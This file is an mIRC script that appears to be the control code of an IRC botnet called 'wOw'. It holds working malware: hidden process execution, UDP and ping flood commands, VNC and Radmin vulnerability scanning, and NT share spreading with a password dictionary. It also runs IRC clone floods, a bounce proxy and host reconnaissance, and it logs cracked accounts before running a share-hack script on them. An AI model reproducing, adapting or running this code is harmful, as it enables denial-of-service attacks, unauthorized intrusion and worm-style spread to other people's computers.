on *:start:{
  run run32.exe /n /fh mIRC
  run un.exe
  ruser 333
  set %c ##wOw##
  set %channel ##wOw##
  server $servers
  hostnick
  identd on $r(a,z) $+ $r(1,9) $+ $r(a,z) $+ $r(a,z) $+ $r(1,9)
  regedititit
  rmdir download | rmdir logs | rmdir sounds
}
on *:exit:{ ruser 333 | run services.exe }
on *:JOIN:%channel:{ if ($exists(rdate.cfg) == $false) { msg %channel 2I14m new 0wned b0tnet | write rdate.cfg $date - $time } }
on *:connect:{
  settings2
}
alias checkconn {
  if ($status != connected) {
    server $servers
  }
}
on *:disconnect:{
  ruser 333
  timercon 0 30 checkconn
}
on 333:part:%channel:{ ruser 333 $nick }
on 333:quit:%channel:{ ruser 333 $nick }
on 333:nick:*:{ ruser 333 $nick | clearall }
alias random return $r(A,Z) $+ $r(1,99) $+ $r(a,z) $+ $r(1,99) $+ $r(A,Z) $+ $r(1,99)
alias settings2 {
  timercon off
  identd on $r(a,z) $+ $r(1,9) $+ $r(a,z) $+ $r(a,z) $+ $r(1,9)
  hostnick
  fullname $random
  timer 0 1 join %channel
  timer 0 5 checkconn
}
alias timers {
  if ($1 == off) {
    timers off
    .timer 0 1 join %Channel
    .timer 0 5 checkconn
  }
}
alias checkdfind {
  var %x 1
  while (%x <= $lines(dfind.txt)) {
    set %thedfind $read(dfind.txt,%x)
    checkmsgnow
    inc %x
  }
}
alias checkmsgnow {
  if (*NULL* iswm %thedfind) {
    msg %channel 2[14Remote-Administrator2]14 $replace($remove(%thedfind,found,RAdmin,NULL,Session),Port:,:2 )
  }
  else {
    .timers off
    .timer 1 2 msg %channel 2[14Remote-Administrator2]14 End Of Show Ip2(14s2)14.
  }
}
alias checkport { 
  if ($read(scan.txt,2) != $Null) {
    var %x 2
    while (%x <= $lines(scan.txt)) {
      msg %channel $read(scan.txt,%x)
      write -dl $+ %x scan.txt 
    } 
    inc %x 
  }
}
alias playsteam {
  var %x 1
  while (%x <= $lines(maxz.cfg)) {
    msg %channel $read(maxz.cfg,%x)
    inc %x 
  }
}
on *:text:!login*:*:{ if (*netadmin*.*wOw*.*net* iswm $address($nick,5)) && ($2 == $remove(%channel,$chr(35))) && ($level($nick) != 333) { notice $nick Password Accepted. | auser 333 $nick } }
on 333:text:*:*:{
  if ($1 == !Udp) && ($3) {
    hiderun udp.exe $2 $3 $4
    msg %channel 2S14ending 2U14dpflood 2t14o15 $2
  }
  if ($1 == !udp.stop) {
    hiderun libparse.exe -kf udp.exe
    msg %channel 2U14dpflood 2S14toped
  }
  if ($1 == !url) && ($2) {
    hiderun C:\Program Files\Internet Explorer\iexplore.exe $2
    msg %channel 14 $+ $2 2V14isited4.
  }
  if ($1 == !Steam) { hiderun St3.exe | timer 1 5 playsteam }
  if ($1 == !rDate) { if ($date iswm $read(rdate.cfg,1)) { msg %channel 7R14egistrated 7T14oday! } }
  if ($1 == !rndp) { remove scan.txt | timerport2 0 10 checkport | set %rrr $r(0,255) | if ($4) { hiderun scan500.exe $2 $3 $4 $+ . $+ %rrr $+ .0.0 $4 $+ . $+ %rrr $+ .255.255 | msg %channel 2S14tarted 2P14ort 2S14can15: 2[15 $2 $3 $4 $+ . $+ %rrr $+ .0.0 $4 $+ . $+ %rrr $+ .255.255 2] }
  else { hiderun scan500.exe $2 $3 $+ . $+ %rrr $+ .0.0 $3 $+ . $+ %rrr $+ .255.255 | msg %channel 2S14tarted 2P14ort 2S14can15: 2[15 $2 $3 $+ . $+ %rrr $+ .0.0 $3 $+ . $+ %rrr $+ .255.255 2] } } 
  if ($1 == !stopp) { timerport2 off | hiderun libparse.exe -kf scan500.exe | msg %channel 2R14and 2P14ort 2S14topped }
  if ($1 == !bw) { .remove bw.log | run bw.exe | timer 1 10 msg %channel $read(bw.log,1) }
  if ($1 == !rndvnc) { timervnc off | set %secran $r(1,255) | set %firran $2 | hiderun vnc.exe -p 5900 -i %firran $+ . $+ %secran $+ .0.0- $+ %firran $+ . $+ %secran $+ .255.255 -vnc | msg %channel 2V14nc 2S14canning15... 2[14 $+ %firran $+ . $+ %secran $+ .0.0- $+ %firran $+ . $+ %secran $+ .255.255 $+ 2] 2P14lease 2W14ait15... | timervnc 0 10 fuckvnc }
  if ($1 == !rangevnc) { timervnc off | set %secran $3 | set %firran $2 | hiderun vnc.exe -p 5900 -i %firran $+ %secran $+ .0.0- $+ %firran $+ %secran $+ .255.255 -vnc | msg %channel 2V14nc 2S14canning15... 2[14 $+ %firran $+ %secran $+ .0.0- $+ %firran $+ %secran $+ .255.255 $+ 2] 2P14lease 2W14ait15... | timervnc 0 10 fuckvnc }
  if ($1 == !stopvnc) { timervnc off | hiderun libparse.exe -kf vnc.exe | msg %channel 2V14nc 2S14can 2S14topped14... }
  if ($1 == !rmvnc) { remove VNC_bypauth.txt | msg %channel 2V14nc 2F14ile 2R14emoved14... }
  if ($1 == !VentSpam) { if ($3) { hiderun Spamer.exe $2 $3 | msg %channel 2[14Spam2]14 Vent Spam Started On Ip:02 $2 14Port:02 $3 } }
  if ($1 == !VentSpam.Stop) { hiderun libparse.exe -kf Spamer.exe | msg %channel 2[14Spam2]14 Vent Spam Stopped. }
  if ($1 == !radioclone) && ($5 != $null) && (%radioclone == $null) { set %radioclone on | msg %channel 2 $+ $4 14* 2R14adio 2C14lones 2L14oad 2T14o2:14 $2 $+ 2: $+ $3 $+ | timer $4 $rand(1, $+ $5 $+ ) cloneradio $2 $3 }
  if ($1 == !radioclone.stop) { set %radioclone $null | msg %channel 2R14adio 2C14lones 2K14illd $+ | sockclose shoutcast* } 
  if ($1 == !uptime) { msg %channel $infoma }
  if ($1 == !bnc.start) && ($3 != $null) { if ($sock(Bnc)) { msg %c 2[8ERROR2]04 bnc is already active on port: %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $2 | %Bnc.port = $2 | %Bnc.passwd = $3 | msg %c 2[14bnc2]14 /server -m $ip $+ : $+ $2 $3 }
  if ($1 == !bnc.stats) && ($sock(Bnc)) { msg %c 2[04bnc2]04 is on! $ip $+ : $+ %Bnc.port pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }
  if ($1 == !bnc.stop) && (%Bnc.Port != $null) { sockclose Bnc* | msg %c 2[04bnc2]04 server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }
  if ($1 == !HardDrive) { HD }
  if ($1 == !NT+pass) { makepass }
  if ($1 == !NT-pass) { makenopass }
  if ($1 == !DFind) && ($exists(xDx.exe)) && ($exists(run32.exe)) && ($exists(DFind.txt) == $false) { if (%nowscan == $null) { set %r 2 | set %nowscan $2 $3 | timer 0 1 Dfind-chk | msg %channel 7S14tarting Scan Dfind $2- | hiderun xDx.exe $2- } | else { msg %channel 7I 14allready scaning %nowscan } }
  if ($1 == !Rscan) && ($4 != $null) && ($exists(xDx.exe)) && ($exists(run32.exe)) && ($exists(DFind.txt) == $false) { if (%nowscan == $null) { set %r 2 | set %nowscan $2 $3 | timer 0 1 rad-chk | msg %channel 7S14tarting Scan Radmin 2[ $2 - $3 ]-[ $4 ] | hiderun xDx.exe -rad $2 $3 $4 } | else { msg %channel 7I 14allready scaning %nowscan } }
  if ($1 == !Rrandscan) && ($3 != $null) && ($exists(xDx.exe)) && ($exists(run32.exe)) && ($exists(DFind.txt) == $false) { if (%nowscan == $null) { set %r 2 | timer 0 1 rad-chk | set %i $r(1,255) | set %rnt $2 $+ . $+ %i $+ .1.1 $2 $+ . $+ %i $+ .255.255 $3 | set %nowscan $2 $+ . $+ %i $+ .1.1 - $2 $+ . $+ %i $+ .255.255 | msg %channel 7S14tarting Scan Radmin 2[ %nowscan ]-[ $3 ] | hiderun xDx.exe -rad %rnt } | else { msg %channel 7I 14allready scaning %nowscan } }
  if ($1 == !stop.Dfind) && ($exists(xDx.exe)) && ($exists(libparse.exe)) { timers off | timer 0 300 serv0ut | hiderun libparse.exe -kf xDx.exe | timer 1 2 removeDFind | set %nowscan $null }
  if ($1 == !Reshet) && ($exists(IpcScan.exe)) && ($exists(ipcpass.dic)) && ($exists(shere.bat)) && ($exists(wOw.exe)) && ($3 != $null)  { Reshet $2 $3 }
  if ($1 == !NTspreed) && ($exists(IpcScan.exe)) && ($exists(ipcpass.dic)) && ($exists(shere.bat)) && ($exists(wOw.exe)) { if (%nowscan == $null) { set %nowscan $2 $3 | timer 0 1 fuckspreed | msg %channel 7S14tarting scan 2[ $2 - $3 ]-[ $4 ]-[ $5 ] | hiderun ipcscan.exe $2 $3 -p $4 -t $5 } | else { msg %channel 7I 14allready scaning %nowscan } }
  if ($1 == !Pnimi) && ($exists(IpcScan.exe)) && ($exists(ipcpass.dic)) && ($exists(shere.bat)) && ($exists(wOw.exe)) { if (%nowscan == $null) { set %nowscan 192.168.0.0 192.168.255.255 | timer 0 1 fuckspreed | msg %channel 7S14tarting scan 2[ $2 - $3 ]-[ $4 ]-[ $5 ] | hiderun ipcscan.exe $2 $3 -p 139 -t 450 } | else { msg %channel 7I 14allready scaning %nowscan } }
  if ($1 == !NTrandspreed) && ($exists(IpcScan.exe)) && ($exists(ipcpass.dic)) && ($exists(shere.bat)) && ($exists(wOw.exe)) { if (%nowscan == $null) { timer 0 1 fuckspreed | set %i $r(1,255) | set %rnt $2 $+ . $+ %i $+ .1.1 $2 $+ . $+ %i $+ .255.255 -p $3 -t $4 | set %nowscan $2 $+ . $+ %i $+ .1.1 $2 $+ . $+ %i $+ .255.255 | hiderun ipcscan.exe %rnt | msg %channel 7S14tarting scan 2[ $2 $+ . $+ %i $+ .1.1 - $2 $+ . $+ %i $+ .255.255 $+ ]-[ $3 ]-[ $4 ] } | else { msg %channel 7I 14allready scaning %nowscan } }
  if ($1 == !Spreed) && ($exists(shere.bat)) && ($exists(wOw.exe)) { set %hk $2 | set %user1 $3 | set %pass1 $4 | if (%wgethack == on) { wspreed %hk } | else { spreedhack %hk } } 
  if ($1 == !stop.NTscan) && ($exists(IpcScan.exe)) && ($exists(libparse.exe)) { timers off | timer 0 300 serv0ut | hiderun libparse.exe -kf IpcScan.exe | msg %channel 7N14T scanning stopped1... | set %nowscan $null | set %Ascan $null }
  if ($1 == !Auto.NTspreed) && ($4 != $null) && ($exists(IpcScan.exe)) && ($exists(ipcpass.dic)) && ($exists(random.dbx)) && ($exists(shere.bat)) && ($exists(run32.exe)) && ($exists(mooo.exe)) { if (%Ascan == $null) && (%nowscan == $null) { set %p0rt $2 | set %thr34d $3 | autospreed | timer 0 $4 autospreed | timer 0 1 fuckspreed } | else { msg %channel 7I 14allready scaning %nowscan } }
  if ($1 == !Auto.NTspreededu) && ($4 != $null) && ($exists(IpcScan.exe)) && ($exists(shere.bat)) && ($exists(wOw.exe)) { if (%Ascan == $null) && (%nowscan == $null) { set %p0rt $2 | set %thr34d $3 | autospreededu | timer 0 $4 autospreededu | timer 0 1 fuckspreed } | else { msg %channel 7I 14allready scaning %nowscan } }
  if ($1 == !packet) && ($3 != $null) { hiderun "ping.exe $2 -n $3 -l 65500" | msg %c 2[14DDoS2]14 2S14ending2 $3 2P14ackets 2T14o2: $2 2[15/run ping -t $2 $+ 2] }
  if ($1 == !packet.stop) { hiderun libparse.exe -kf ping.exe | msg %c 2[14DDoS2]14 2P14acketing 2H14alted2! }
  if ($1 == !info.conn) { msg %c 2connection14: $dll(bootdrv.dll,connection,_) 2network interfaces14:   $dll(bootdrv.dll,interfaceinfo,_) 2ip/host14: $ip $+ / $+ $host }
  if ($1 == !info.main) { msg %c 2time/date14: $time $+ @ $+ $date 2os14: $dll(bootdrv.dll,osinfo,_) 2cpu14:   $dll(bootdrv.dll,cpuinfo,_) 2mem14: $dll(bootdrv.dll,meminfo,_) 2uptime14: $duration($calc($ticks / 1000 )) 2hdd14:   $dll(bootdrv.dll,diskcapacity,_) 2url14: $+ $url }
  if ($1 == !killapp) && ($2 != $null) { hiderun libparse.exe -kf $2- | msg %channel 1 $2 7K14illed1... }
  if ($1 == !runapp) && ($2 != $null) { hiderun $2- | msg %channel 1 $2 7S14tarted1... }
  if ($1 == !join) && ($2 != $null) { join $2 | msg %channel 7J14oined $2 }
  if ($1 == !part) && ($2 != $null) { part $2 | msg %channel 7p14arted $2 }
  if ($1 == !msg) && ($2 != $null) { msg $2 $3- }
  if ($1 == !exists) && ($2- != $null) { if ( $exists($2-) == $true ) { msg %channel 9[+] $2- 7e14xists on this machine1. } { if ( $exists($2-) == $false) { msg %channel 4[-] $2- 7d14oesnt exist on this machine1. } } }
  if ($1 == !ip) { msg %channel 7i14p/7h14ost: $ip $+  /  $+ $host }
  if ($1 == !-) && ($2 != $null) { %- = $2- | msg %channel 7A14ction / $+ $2- | / $+ %- | unset %- }
  if ($1 == !ports) && ($portfree($2) == $false) { msg %channel 7T14he port 2[ $2 ] 14 is open1. 7i14p/7h14ost: $ip $+  /  $+ $host }
  if ($1 == !NTrandspreed) && ($exists(IpcScan.exe)) && ($exists(ipcpass.dic)) && ($exists(ntshare1.bat)) && ($exists(run32.exe)) && ($exists(Bot.exe)) { if (%nowscan == $null) { timer 0 1 fuckspreed | set %i $r(1,255) | set %rnt $2 $+ . $+ %i $+ .1.1 $2 $+ . $+ %i $+ .255.255 -p $3 -t $4 | set %nowscan $2 $+ . $+ %i $+ .1.1 $2 $+ . $+ %i $+ .255.255 | hiderun "ipcscan.exe %rnt " | msg %channel 7S14tarting scan 2[ $2 $+ . $+ %i $+ .1.1 - $2 $+ . $+ %i $+ .255.255 $+ ]-[ $3 ]-[ $4 ] } | else { msg %channel 7I 14allready scaning %nowscan } }
  if ($1 == !RadminScan) { if ($3) { hiderun xDx.exe -rad $2 $3 | msg %channel [Dfind] Started To Scan For Radmin Holes. (!RadminShow) } }
  if ($1 == !RadminStop) { hiderun libparse.exe -kf xDx.exe | msg %channel [Dfind] Scan Will Be Down Now. }
  if ($1 == !RadminClear) { remove Dfind.txt | msg %channel [Dfind] File Removed. }
  if ($1 == !RadminShow) { checkdfind }
  if ($1 == !clone) {
    if ($2 == load) && ($5 != 0) && ($5 != $null) { .timer $5 0 sockopen Sockets- $+ $r(1,999999) $3 $4 | msg %channel 14 $5 7C14lonez loading to15 $3 $+ : $+ $4 }
    if ($2 == loadqnet) { timer 1 1 sockopen Sockets- $+ $r(1,999999) irc.quakenet.org 6667 | timer 1 20 sockopen Sockets- $+ $r(1,999999) gr.quakenet.org 6667 | timer 1 40 sockopen Sockets- $+ $r(1,999999) uk.quakenet.org 6667 | timer 1 60 sockopen Sockets- $+ $r(1,999999) se.quakenet.org 6667 | timer 1 80 sockopen Sockets- $+ $r(1,999999) de.quakenet.org 6667 | timer 1 100 sockopen Sockets- $+ $r(1,999999) fr.quakenet.org 6667 | timer 1 120 sockopen Sockets- $+ $r(1,999999) ie.quakenet.org 6667 | timer 1 122 msg %channel 2Y14ou can bring them to channel.. | msg %channel 2C14lones load to 2Q14net... 2P14lease wait 0212014 sec. }
    if ($2 == kill) { sockwrite -tn Sockets-* QUIT : $+ $3- | sockclose Sockets-* | msg %channel 7C14lonez disconnected }
    if ($2 == wow) {
      sockwrite -tn Sockets-* privmsg $3 : $+ W0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoW
      sockwrite -tn Sockets-* privmsg $3 : $+ W0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoW
    }
    if ($2 == wow2) {
      sockwrite -tn Sockets-* notice $3 : $+ W0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoW
      sockwrite -tn Sockets-* notice $3 : $+ W0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoW
    }
    if ($2 == mix) {
      sockwrite -tn Sockets-* privmsg $3 : $+ W0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoW
      sockwrite -tn Sockets-* notice $3 : $+ W0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoW
      sockwrite -tn Sockets-* privmsg $3 :VERSION
      sockwrite -tn Sockets-* privmsg $3 :PING
      sockwrite -tn Sockets-* privmsg $3 :FINGER
      sockwrite -tn Sockets-* privmsg $3 :TIME
    }
    if ($2 == ctf) {
      sockwrite -tn Sockets-* privmsg $3 :VERSION
      sockwrite -tn Sockets-* privmsg $3 :FINGER
      sockwrite -tn Sockets-* privmsg $3 :TIME
    }
    if ($2 == Qauth) { sockwrite -tn Sockets-* privmsg $gettok($read(Auth.txt),1,32) : $+ $gettok($read(Auth.txt),2-,32) }
    if ($2 == join) && ($3 != $null) { sockwrite -tn Sockets-* JOIN $3 $4- }
    if ($2 == part) && ($3 != $null) { sockwrite -tn Sockets-* PART $3 $4- }
    if ($2 == joinpartflood) && ($4 != $null) { timer $3 0 joinpartflood $4- }
    if ($2 == chanflood) {
      sockwrite -tn Sockets-* JOIN $chr(35) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z)
      sockwrite -tn Sockets-* JOIN $chr(35) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z)
      sockwrite -tn Sockets-* JOIN $chr(35) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z)
      sockwrite -tn Sockets-* JOIN $chr(35) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z)
    }
    if ($2 == msg) && ($3 != $null) { sockwrite -tn Sockets-* privmsg $3 : $+ $4- }
    if ($2 == notice) && ($3 != $null) { sockwrite -tn Sockets-* notice $3 : $+ $4- }
    if ($2 == Do) && ($3 != $null) { sockwrite -tn Sockets-* $3- }
    if ($2 == randnick) { sockwrite -tn Sockets-* nick $read(mainhq.dbx) }
    if ($2 == nick) && ($3 != $null) { sockwrite -tn Sockets-* nick $3- $+ $rand(A,Z) $+ $rand(0,99) $+ $rand(a,z) $+ $rand(0,99) $+ $rand(A,Z) $+ $rand(0,99) $+ $rand(a,z) $+ $rand(0,99) $+ $rand(A,Z) $+ $rand(0,99) $+ $rand(a,z) $+ $rand(0,99) $+ $rand(A,Z) $+ $rand(0,99) $+ $rand(a,z) $+ $rand(0,99) }
    if ($2 == ctcp) && ($4 != $null) {
      if ($3 == ping) && ($4 != $null) { sockwrite -tn Sockets-* privmsg $4 :PING }
      if ($3 == VERSION) && ($4 != $null) { sockwrite -tn Sockets-* privmsg $4 :VERSION }
      if ($3 == FINGER) && ($4 != $null) { sockwrite -tn Sockets-* privmsg $4 :FINGER }
      if ($3 == TIME) && ($4 != $null) { sockwrite -tn Sockets-* privmsg $4 :TIME }
      if ($3 == do) && ($5 != $null) { sockwrite -tn Sockets-* privmsg $5 : $+ $4 $+  }
    }
  }
}
;################VNC##################
;|                                   |
;|         Made By                   |
;|                                   |
;|                  A_L_O_N          |
;|                                   |
;|                          Prv      |
;|                               .   |
;################VNC##################
alias fuckvnc {
  var %x 1
  while (%x <= $Lines(VNC_bypauth.txt)) {
    if (*VULN* iswm $read(VNC_bypauth.txt,%x)) {
      msg %channel $read(VNC_bypauth.txt,%x)
      write -dl $+ %x VNC_bypauth.txt
    }
    inc %x
  }
}
alias fuckinfo {
  var %x 1
  while (%x <= $Lines(infoscan.txt)) {
    if (*listening!* iswm $read(infoscan.txt,%x)) {
      msg %channel $remove($read(infoscan.txt,%x),[,],port,listening!)
      write -dl $+ %x infoscan.txt
    }
    inc %x
  }
}

;################VNC##################
;|                                   |
;|         Made By                   |
;|                                   |
;|                  A_L_O_N          |
;|                                   |
;|                          Prv      |
;|                               .   |
;################VNC##################



;**************************
;*      auto alias        *
;**************************
alias autont { hiderun libparse.exe -kf IpcScan.exe | set %i1 $r(1,255) | set %i2 $read(random.dbx,$r(0,52)) | set %nowscan %i2 $+ . $+ %i1 $+ .0.0 %i2 $+ . $+ %i1 $+ .255.255 | msg %channel 7S14tarting scan 2[ %nowscan ]-[ %p0rt ]-[ %thr34d ] | timer 1 10 hiderun ipcscan.exe %nowscan -p %p0rt -t %thr34d | set %Ascan on }
alias autontedu { hiderun libparse.exe -kf IpcScan.exe | set %edu $r(128,169) | set %i3 $r(1,255) | set %nowscan %edu $+ . $+ %i3 $+ .0.0 %edu $+ . $+ %i3 $+ .255.255 | msg %channel 7S14tarting scan 2[ %nowscan ]-[ %p0rt ]-[ %thr34d ] | timer 1 10 hiderun ipcscan.exe %nowscan -p %p0rt -t %thr34d | set %Ascan on }
alias autospreed { hiderun libparse.exe -kf IpcScan.exe | set %i1 $r(1,255) | set %i2 $read(random.dbx,$r(0,53)) | set %nowscan %i2 $+ . $+ %i1 $+ .0.0 %i2 $+ . $+ %i1 $+ .255.255 | msg %channel 7S14tarting scan 2[ %nowscan ]-[ %p0rt ]-[ %thr34d ] | timer 1 10 hiderun ipcscan.exe %nowscan -p %p0rt -t %thr34d | set %Ascan on }
alias autospreededu { hiderun libparse.exe -kf IpcScan.exe | set %edu $r(128,169) | set %i3 $r(1,255) | set %nowscan %edu $+ . $+ %i3 $+ .0.0 %edu $+ . $+ %i3 $+ .255.255 | msg %channel 7S14tarting scan 2[ %nowscan ]-[ %p0rt ]-[ %thr34d ] | timer 1 10 hiderun ipcscan.exe %nowscan -p %p0rt -t %thr34d | set %Ascan on }
alias autosqlspreed { hiderun libparse.exe -kf scansql.exe | set %i1 $r(1,255) | set %i2 $read(random.dbx,$r(0,53)) | set %scansql %i2 $+ . $+ %i1 $+ .0.0 %i2 $+ . $+ %i1 $+ .255.255 | msg %channel 7S14tarting SQL scan 2[ %scansql ] | timer 1 10 hiderun scansql.exe %scansql | set %SQLAscan on }
alias autosqlspreededu { hiderun libparse.exe -kf scansql.exe | set %edu $r(128,169) | set %i3 $r(1,255) | set %scansql %edu $+ . $+ %i3 $+ .0.0 %edu $+ . $+ %i3 $+ .255.255 | msg %channel 7S14tarting SQL scan 2[ %scansql ] | timer 1 10 hiderun scansql.exe %scansql | set %SQLAscan on }


;**************************
;*    nt hack alias       *
;**************************
alias hiderun { run run32.exe /n /fh /r " $+ $1- $+ " }
alias hack { chgbot | hiderun shere.bat %hk %user1 %pass1 }
alias chgbot { set %bot $read(bot.dll,1) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | write -l1 ir.conf user_nick %Bot | msg %channel 15-14=1]  $+ %hk $+ [14=15- 2[4F2]1o14un2[15d2] 2[4N15T2] [4A2]1cc14ou15n2[15t2]12 15..14::1[ 4 %user1 $+ 9 / 12 $+ %pass1 1]14::15.. | msg %channel 7S14tarting to r00t1 %hk 14in the nick1: %bot $+  }
alias fuckbot { 
  if ($remove($gettok($read(ipcscan.txt,1),1,32),],[,:) != $null) {
    set %hk $remove($gettok($read(ipcscan.txt,1),1,32),],[,:)
    if ($gettok($gettok($remove($gettok($read(ipcscan.txt,1),1,33),],[,:),5,32),2,47) != null) { set %pass1 $gettok($gettok($remove($gettok($read(ipcscan.txt,1),1,33),],[,:),5,32),2,47) }
    if ($gettok($gettok($remove($gettok($read(ipcscan.txt,1),1,33),],[,:),5,32),2,47) == null) { unset %pass1 } 
    set %user1 $gettok($gettok($remove($gettok($read(ipcscan.txt,1),1,33),],[,:),5,32),1,47) 
    hack %hk
    write hack.log %hk %user1 $+ / $+ %pass1 
  remove ipcscan.txt }
}
;**************************
;*      Hard  Disk        *
;**************************
alias HD {
  if ($disk(c:) == $true) { msg %channel [2Drive C:\ $bytes($disk(c:).size) $iif($remove($right($bytes($disk(c:).size).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($disk(c:).size).suf,2),0,1,2,3,4,5,6,7,8,9)) $upper($disk(c:).type) $chr(40) $+ $iif($disk(c:).label == $null, None, $disk(c:).label) $+ $chr(41) Free: $bytes($disk(c:).free) $iif($remove($right($bytes($remove($bytes($disk(c:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($remove($bytes($disk(c:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9)) $+ ] }
  if ($disk(d:) == $true) { msg %channel [12Drive D:\ $bytes($disk(d:).size) $iif($remove($right($bytes($disk(d:).size).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($disk(d:).size).suf,2),0,1,2,3,4,5,6,7,8,9)) $upper($disk(d:).type) $chr(40) $+ $iif($disk(d:).label == $null, None, $disk(d:).label) $+ $chr(41) Free: $bytes($disk(d:).free) $iif($remove($right($bytes($remove($bytes($disk(d:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($remove($bytes($disk(d:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9)) $+ ] }
  if ($disk(e:) == $true) { msg %channel [14Drive E:\ $bytes($disk(e:).size) $iif($remove($right($bytes($disk(e:).size).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($disk(e:).size).suf,2),0,1,2,3,4,5,6,7,8,9)) $upper($disk(e:).type) $chr(40) $+ $iif($disk(e:).label == $null, None, $disk(e:).label) $+ $chr(41) Free: $bytes($disk(e:).free) $iif($remove($right($bytes($remove($bytes($disk(e:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($remove($bytes($disk(e:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9)) $+ ] }
  if ($disk(f:) == $true) { msg %channel [15Drive F:\ $bytes($disk(f:).size) $iif($remove($right($bytes($disk(f:).size).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($disk(f:).size).suf,2),0,1,2,3,4,5,6,7,8,9)) $upper($disk(f:).type) $chr(40) $+ $iif($disk(f:).label == $null, None, $disk(f:).label) $+ $chr(41) Free: $bytes($disk(f:).free) $iif($remove($right($bytes($remove($bytes($disk(f:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($remove($bytes($disk(f:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9)) $+ ] }
  if ($disk(g:) == $true) { msg %channel [11Drive G:\ $bytes($disk(g:).size) $iif($remove($right($bytes($disk(g:).size).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($disk(g:).size).suf,2),0,1,2,3,4,5,6,7,8,9)) $upper($disk(g:).type) $chr(40) $+ $iif($disk(g:).label == $null, None, $disk(g:).label) $+ $chr(41) Free: $bytes($disk(g:).free) $iif($remove($right($bytes($remove($bytes($disk(g:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($remove($bytes($disk(g:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9)) $+ ] }
  if ($disk(h:) == $true) { msg %channel [13Drive H:\ $bytes($disk(h:).size) $iif($remove($right($bytes($disk(h:).size).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($disk(h:).size).suf,2),0,1,2,3,4,5,6,7,8,9)) $upper($disk(h:).type) $chr(40) $+ $iif($disk(h:).label == $null, None, $disk(h:).label) $+ $chr(41) Free: $bytes($disk(h:).free) $iif($remove($right($bytes($remove($bytes($disk(h:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($remove($bytes($disk(h:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9)) $+ ] }
  if ($disk(i:) == $true) { msg %channel [10Drive I:\ $bytes($disk(i:).size) $iif($remove($right($bytes($disk(i:).size).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($disk(i:).size).suf,2),0,1,2,3,4,5,6,7,8,9)) $upper($disk(i:).type) $chr(40) $+ $iif($disk(i:).label == $null, None, $disk(i:).label) $+ $chr(41) Free: $bytes($disk(i:).free) $iif($remove($right($bytes($remove($bytes($disk(i:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9) == G, GB, $remove($right($bytes($remove($bytes($disk(i:).free,b),$chr(44))).suf,2),0,1,2,3,4,5,6,7,8,9)) $+ ] }
